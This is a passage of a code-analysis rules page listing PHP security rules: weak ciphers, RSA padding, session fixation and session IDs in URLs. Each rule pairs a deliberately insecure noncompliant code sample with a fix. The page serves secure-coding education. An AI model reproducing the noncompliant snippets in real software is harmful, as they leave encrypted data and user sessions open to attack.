            file_put_contents($filename, $data, FILE_APPEND);
        }
    } else {
        mkdir($filename);
    }
}
zip_close($zip);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> -
  Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/409" rel="nofollow">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li><li> <a href="https://www.bamsoftware.com/hacks/zipbomb/" rel="nofollow">bamsoftware.com</a> - A better Zip Bomb </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2278">
              php:S2278
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;php%3AS5547&amp;rule_key&#61;php%3AS5547" rel="nofollow">S5547</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>
<blockquote>
  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer
  provides the security that is needed to protect federal government information.</p>
  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>
</blockquote>
<p>For similar reasons, RC2 should also be avoided.</p>
<h3>Noncompliant code example</h3>
<pre>
&lt;?php
  $ciphertext &#61; mcrypt_encrypt(MCRYPT_DES, $key, $plaintext, $mode); // Noncompliant
  // ...
  $ciphertext &#61; mcrypt_encrypt(MCRYPT_DES_COMPAT, $key, $plaintext, $mode); // Noncompliant
  // ...
  $ciphertext &#61; mcrypt_encrypt(MCRYPT_TRIPLEDES, $key, $plaintext, $mode); // Noncompliant
  // ...
  $ciphertext &#61; mcrypt_encrypt(MCRYPT_3DES, $key, $plaintext, $mode); // Noncompliant

  $cipher &#61; &#34;des-ede3-cfb&#34;;  // Noncompliant
  $ciphertext_raw &#61; openssl_encrypt($plaintext, $cipher, $key, $options&#61;OPENSSL_RAW_DATA, $iv);
?&gt;
</pre>
<h3>Compliant solution</h3>
<pre>
&lt;?php
  $ciphertext &#61; mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $plaintext, MCRYPT_MODE_CBC, $iv);
?&gt;
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE" rel="nofollow">DES / DESede Unsafe</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5547">
              php:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection. </li><li> Security during transmission or on storage devices. </li><li> Data integrity, general trust, and authentication. </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Mcrypt</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
mcrypt_encrypt(MCRYPT_DES, $key, $plaintext, $mode); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>Mcrypt is deprecated and should not be used. You can use <a href="https://www.php.net/manual/en/book.sodium.php" rel="nofollow">Sodium</a> instead.</p>
<pre data-diff-id="1" data-diff-type="compliant">
sodium_crypto_aead_aes256gcm_encrypt($plaintext, &#39;&#39;, $nonce, $key);
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5542">
              php:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest modes are CBC (Cipher Block Chaining) and ECB</p>
<p>(Electronic Codebook), as they are either vulnerable to padding oracles or do not provide authentication mechanisms.</p>
<p>And for RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Mcrypt</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
mcrypt_encrypt(MCRYPT_DES, $key, $plaintext, &#34;ecb&#34;); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>Mcrypt is deprecated and should not be used. You can use <a href="https://www.php.net/manual/en/book.sodium.php" rel="nofollow">Sodium</a> instead.</p>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
sodium_crypto_aead_aes256gcm_encrypt($plaintext, &#39;&#39;, $nonce, $key);
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: Use Galois/Counter mode (GCM)</h4>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul><li> CCM: <code>Counter with CBC-MAC</code> </li><li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li><li> EAX: <code>Encrypt-and-Authenticate</code> </li><li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li><li> OCB: <code>Offset Codebook Mode</code> </li></ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it</p>
<p>is considered more straightforward to use AES-GCM directly instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2277">
              php:S2277
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;php%3AS5542&amp;rule_key&#61;php%3AS5542" rel="nofollow">S5542</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>Without OAEP in RSA encryption, it takes less work for an attacker to decrypt the data or infer patterns from the ciphertext. This rule logs an
issue when <code>openssl_public_encrypt</code> is used with one the following padding constants: <code>OPENSSL_NO_PADDING</code> or
<code>OPENSSL_PKCS1_PADDING</code> or <code>OPENSSL_SSLV23_PADDING</code>.</p>
<h3>Noncompliant code example</h3>
<pre>
function encrypt($data, $key) {
  $crypted&#61;&#39;&#39;;
  openssl_public_encrypt($data, $crypted, $key, OPENSSL_NO_PADDING); // Noncompliant
  return $crypted;
}
</pre>
<h3>Compliant solution</h3>
<pre>
function encrypt($data, $key) {
  $crypted&#61;&#39;&#39;;
  openssl_public_encrypt($data, $crypted, $key, OPENSSL_PKCS1_OAEP_PADDING);
  return $crypted;
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/780" rel="nofollow">MITRE, CWE-780</a> - Use of RSA Algorithm without OAEP </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#RSA_NO_PADDING" rel="nofollow">RSA NoPadding Unsafe</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5876">
              php:S5876
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Session fixation attacks occur when an attacker can force a legitimate user to use a session ID that he knows. To avoid fixation attacks, it’s a
good practice to generate a new session each time a user authenticates and delete/invalidate the existing session (the one possibly known by the
attacker).</p>
<h3>Noncompliant code example</h3>
<p>In a <a href="https://symfony.com/doc/current/reference/configuration/security.html#session-fixation-strategy" rel="nofollow">Symfony Security</a>&#39;s context,
session fixation protection can be disabled with the value <code>none</code> for the <code>session_fixation_strategy</code> attribute:</p>
<pre>
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return static function (ContainerConfigurator $container) {
    $container-&gt;extension(&#39;security&#39;, [
        &#39;session_fixation_strategy&#39; &#61;&gt; &#39;none&#39;, // Noncompliant
    ]);
};
</pre>
<h3>Compliant solution</h3>
<p>In a <a href="https://symfony.com/doc/current/reference/configuration/security.html#session-fixation-strategy" rel="nofollow">Symfony Security</a>&#39;s context,
session fixation protection is enabled by default. It can be explicitly enabled with the values <code>migrate</code> and <code>invalidate</code> for
the <code>session_fixation_strategy</code> attribute:</p>
<pre>
namespace Symfony\Component\DependencyInjection\Loader\Configurator;

return static function (ContainerConfigurator $container) {
    $container-&gt;extension(&#39;security&#39;, [
        &#39;session_fixation_strategy&#39; &#61;&gt; &#39;migrate&#39;, // Compliant
    ]);
};
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> -
  Broken Authentication </li><li> <a href="https://owasp.org/www-community/attacks/Session_fixation" rel="nofollow">OWASP Sesssion Fixation</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/384" rel="nofollow">MITRE, CWE-384</a> - Session Fixation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3336">
              php:S3336
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>PHP’s <code>session.use_trans_sid</code> automatically appends the user’s session id to urls when cookies are disabled. On the face of it, this
seems like a nice way to let uncookie-able users use your site anyway. In reality, it makes those users vulnerable to having their sessions hijacked
by anyone who might:</p>
<ul><li> see the URL over the user’s shoulder </li><li> be sent the URL by the user </li><li> retrieve the URL from browser history </li><li> …​ </li></ul>
<p>For that reason, it’s better to practice a little &#34;tough love&#34; with your users and force them to turn on cookies.</p>
<p>Since <code>session.use_trans_sid</code> is off by default, this rule raises an issue when it is explicitly enabled.</p>
<h3>Noncompliant code example</h3>
<pre>
; php.ini
session.use_trans_sid&#61;1  ; Noncompliant
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4787">
              php:S4787
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;php%3AS4426&amp;rule_key&#61;php%3AS4426" rel="nofollow">S4426</a>, <a href="/organizations/sopra-steria/rules?open&#61;php%3AS5542&amp;rule_key&#61;php%3AS5542" rel="nofollow">S5542</a>, <a href="/organizations/sopra-steria/rules?open&#61;php%3AS5547&amp;rule_key&#61;php%3AS5547" rel="nofollow">S5547</a> instead.</p>
<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-7902" rel="nofollow">CVE-2017-7902</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-1378" rel="nofollow">CVE-2006-1378</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2003-1376" rel="nofollow">CVE-2003-1376</a> </li></ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p>This rule flags function calls that initiate encryption/decryption.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the private key might not be random, strong enough or the same key is reused for a long long time. </li><li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li><li> the key exchange is made without properly authenticating the receiver. </li><li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li><li> the chosen encryption library is deemed unsafe. </li><li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li><li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li><li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it’s IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li><li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li></ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Generate encryption keys using secure random algorithms. </li><li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li><li> Regenerate the keys regularly. </li><li> Always store the keys in a safe location and transfer them only over safe channels. </li><li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li><li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li><li> When a nonce is used, generate it randomly every time. </li><li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li><li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like &#34;Chosen-Plaintext Attacks&#34;. Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV’s purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li><li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul><li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn’t provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li><li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<p>Builtin functions</p>
<pre>
function myEncrypt($cipher, $key, $data, $mode, $iv, $options, $padding, $infile, $outfile, $recipcerts, $headers, $nonce, $ad, $pub_key_ids, $env_keys)
{
    mcrypt_ecb ($cipher, $key, $data, $mode); // Sensitive
    mcrypt_cfb($cipher, $key, $data, $mode, $iv); // Sensitive
    mcrypt_cbc($cipher, $key, $data, $mode, $iv); // Sensitive
    mcrypt_encrypt($cipher, $key, $data, $mode); // Sensitive

    openssl_encrypt($data, $cipher, $key, $options, $iv); // Sensitive
    openssl_public_encrypt($data, $crypted, $key, $padding); // Sensitive
    openssl_pkcs7_encrypt($infile, $outfile, $recipcerts, $headers); // Sensitive
    openssl_seal($data, $sealed_data, $env_keys, $pub_key_ids); // Sensitive

    sodium_crypto_aead_aes256gcm_encrypt ($data, $ad, $nonce, $key); // Sensitive
    sodium_crypto_aead_chacha20poly1305_encrypt ($data, $ad, $nonce, $key); // Sensitive
    sodium_crypto_aead_chacha20poly1305_ietf_encrypt ($data, $ad, $nonce, $key); // Sensitive
    sodium_crypto_aead_xchacha20poly1305_ietf_encrypt ($data, $ad, $nonce, $key); // Sensitive
    sodium_crypto_box_seal ($data, $key); // Sensitive
    sodium_crypto_box ($data, $nonce, $key); // Sensitive
    sodium_crypto_secretbox ($data, $nonce, $key); // Sensitive
    sodium_crypto_stream_xor ($data, $nonce, $key); // Sensitive
}
</pre>
<p>CakePHP</p>
<pre>
use Cake\Utility\Security;

function myCakeEncrypt($key, $data, $engine)
{
    Security::encrypt($data, $key); // Sensitive

    // Do not use custom made engines and remember that Mcrypt is deprecated.
    Security::engine($engine); // Sensitive. Setting the encryption engine.
}
</pre>
<p>CodeIgniter</p>
<pre>
class EncryptionController extends CI_Controller
{
    public function __construct()
    {
        parent::__construct();
        $this-&gt;load-&gt;library(&#39;encryption&#39;);
    }

    public function index()
    {
        $this-&gt;encryption-&gt;create_key(16); // Sensitive. Review the key length.
        $this-&gt;encryption-&gt;initialize( // Sensitive.
            array(
                &#39;cipher&#39; &#61;&gt; &#39;aes-256&#39;,
                &#39;mode&#39; &#61;&gt; &#39;ctr&#39;,
                &#39;key&#39; &#61;&gt; &#39;the key&#39;,
            )
        );
        $this-&gt;encryption-&gt;encrypt(&#34;mysecretdata&#34;); // Sensitive.
    }
}
</pre>
<p>CraftCMS version 3</p>
<pre>
use Craft;

// This is similar to Yii as it used by CraftCMS
function craftEncrypt($data, $key, $password) {
    Craft::$app-&gt;security-&gt;encryptByKey($data, $key); // Sensitive
    Craft::$app-&gt;getSecurity()-&gt;encryptByKey($data, $key); // Sensitive
    Craft::$app-&gt;security-&gt;encryptByPassword($data, $password); // Sensitive
    Craft::$app-&gt;getSecurity()-&gt;encryptByPassword($data, $password); // Sensitive
}
</pre>
<p>Drupal 7 - Encrypt module</p>
<pre>
function drupalEncrypt() {
    $encrypted_text &#61; encrypt(&#39;some string to encrypt&#39;); // Sensitive
}
</pre>
<p>Joomla</p>
<pre>
use Joomla\Crypt\CipherInterface;

abstract class MyCipher implements CipherInterface // Sensitive. Implementing custom cipher class
{}

function joomlaEncrypt() {
    new Joomla\Crypt\Cipher_Sodium(); // Sensitive
    new Joomla\Crypt\Cipher_Simple(); // Sensitive
    new Joomla\Crypt\Cipher_Rijndael256(); // Sensitive
    new Joomla\Crypt\Cipher_Crypto(); // Sensitive
    new Joomla\Crypt\Cipher_Blowfish(); // Sensitive
    new Joomla\Crypt\Cipher_3DES(); // Sensitive
}
}
</pre>
<p>Laravel</p>
<pre>
use Illuminate\Support\Facades\Crypt;

function myLaravelEncrypt($data)
{
    Crypt::encryptString($data); // Sensitive
    Crypt::encrypt($data); // Sensitive
    // encrypt using the Laravel &#34;encrypt&#34; helper
    encrypt($data); // Sensitive
}
</pre>
<p>PHP-Encryption library</p>
<pre>
use Defuse\Crypto\Crypto;
use Defuse\Crypto\File;

function mypPhpEncryption($data, $key, $password, $inputFilename, $outputFilename, $inputHandle, $outputHandle) {
    Crypto::encrypt($data, $key); // Sensitive
    Crypto::encryptWithPassword($data, $password); // Sensitive
    File::encryptFile($inputFilename, $outputFilename, $key); // Sensitive
    File::encryptFileWithPassword($inputFilename, $outputFilename, $password); // Sensitive
    File::encryptResource($inputHandle, $outputHandle, $key); // Sensitive
    File::encryptResourceWithPassword($inputHandle, $outputHandle, $password); // Sensitive
}
</pre>
<p>PhpSecLib</p>
<pre>
function myphpseclib($mode) {
    new phpseclib\Crypt\RSA(); // Sensitive. Note: RSA can also be used for signing data.
    new phpseclib\Crypt\AES(); // Sensitive
    new phpseclib\Crypt\Rijndael(); // Sensitive
    new phpseclib\Crypt\Twofish(); // Sensitive
    new phpseclib\Crypt\Blowfish(); // Sensitive
    new phpseclib\Crypt\RC4(); // Sensitive
    new phpseclib\Crypt\RC2(); // Sensitive
    new phpseclib\Crypt\TripleDES(); // Sensitive
    new phpseclib\Crypt\DES(); // Sensitive

    new phpseclib\Crypt\AES($mode); // Sensitive
    new phpseclib\Crypt\Rijndael($mode); // Sensitive
    new phpseclib\Crypt\TripleDES($mode); // Sensitive
    new phpseclib\Crypt\DES($mode); // Sensitive
}
</pre>
<p>Sodium Compat library</p>
<pre>
function mySodiumCompatEncrypt($data, $ad, $nonce, $key) {
    ParagonIE_Sodium_Compat::crypto_aead_chacha20poly1305_ietf_encrypt($data, $ad, $nonce, $key); // Sensitive
    ParagonIE_Sodium_Compat::crypto_aead_xchacha20poly1305_ietf_encrypt($data, $ad, $nonce, $key); // Sensitive
    ParagonIE_Sodium_Compat::crypto_aead_chacha20poly1305_encrypt($data, $ad, $nonce, $key); // Sensitive

    ParagonIE_Sodium_Compat::crypto_aead_aes256gcm_encrypt($data, $ad, $nonce, $key); // Sensitive

    ParagonIE_Sodium_Compat::crypto_box($data, $nonce, $key); // Sensitive
    ParagonIE_Sodium_Compat::crypto_secretbox($data, $nonce, $key); // Sensitive
    ParagonIE_Sodium_Compat::crypto_box_seal($data, $key); // Sensitive
    ParagonIE_Sodium_Compat::crypto_secretbox_xchacha20poly1305($data, $nonce, $key); // Sensitive
}
</pre>
<p>Yii version 2</p>
<pre>
use Yii;

// Similar to CraftCMS as it uses Yii
function YiiEncrypt($data, $key, $password) {
    Yii::$app-&gt;security-&gt;encryptByKey($data, $key); // Sensitive
    Yii::$app-&gt;getSecurity()-&gt;encryptByKey($data, $key); // Sensitive
    Yii::$app-&gt;security-&gt;encryptByPassword($data, $password); // Sensitive
    Yii::$app-&gt;getSecurity()-&gt;encryptByPassword($data, $password); // Sensitive
}
</pre>
<p>Zend</p>
<pre>
use Zend\Crypt\FileCipher;
use Zend\Crypt\PublicKey\DiffieHellman;
use Zend\Crypt\PublicKey\Rsa;
use Zend\Crypt\Hybrid;
use Zend\Crypt\BlockCipher;

function myZendEncrypt($key, $data, $prime, $options, $generator, $lib)
{
    new FileCipher; // Sensitive. This is used to encrypt files

    new DiffieHellman($prime, $generator, $key); // Sensitive

    $rsa &#61; Rsa::factory([ // Sensitive
        &#39;public_key&#39;    &#61;&gt; &#39;public_key.pub&#39;,
        &#39;private_key&#39;   &#61;&gt; &#39;private_key.pem&#39;,
        &#39;pass_phrase&#39;   &#61;&gt; &#39;mypassphrase&#39;,
        &#39;binary_output&#39; &#61;&gt; false,
    ]);
    $rsa-&gt;encrypt($data); // No issue raised here. The configuration of the Rsa object is the line to review.

    $hybrid &#61; new Hybrid(); // Sensitive

    BlockCipher::factory($lib, $options); // Sensitive
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
